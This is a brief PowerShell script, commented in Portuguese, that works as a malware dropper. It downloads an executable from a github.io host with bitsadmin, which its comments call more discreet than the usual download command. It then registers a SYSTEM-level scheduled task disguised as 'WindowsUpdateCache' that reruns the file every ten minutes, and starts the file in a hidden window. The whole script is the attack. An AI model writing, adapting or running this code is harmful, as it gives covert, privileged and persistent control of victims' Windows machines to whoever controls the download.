$dir = "$env:TEMP\sys_cache"
if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }

# Download via BITSADMIN (Muito mais discreto que Invoke-WebRequest)
start-process "bitsadmin" -ArgumentList "/transfer mydownloadjob https://syslog992.github.io/sys-cache-update/sys_cache.exe $dir\sys_cache.exe" -Wait

# Criação de Tarefa Agendada (Substitui o Registro e o VBS)
# Isso faz o programa rodar a cada 10 minutos, invisível, sem precisar de guardiao.vbs
$action = New-ScheduledTaskAction -Execute "$dir\sys_cache.exe"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsUpdateCache" -User "SYSTEM" -Force

# Inicia o executável agora
Start-Process "$dir\sys_cache.exe" -WindowStyle Hidden
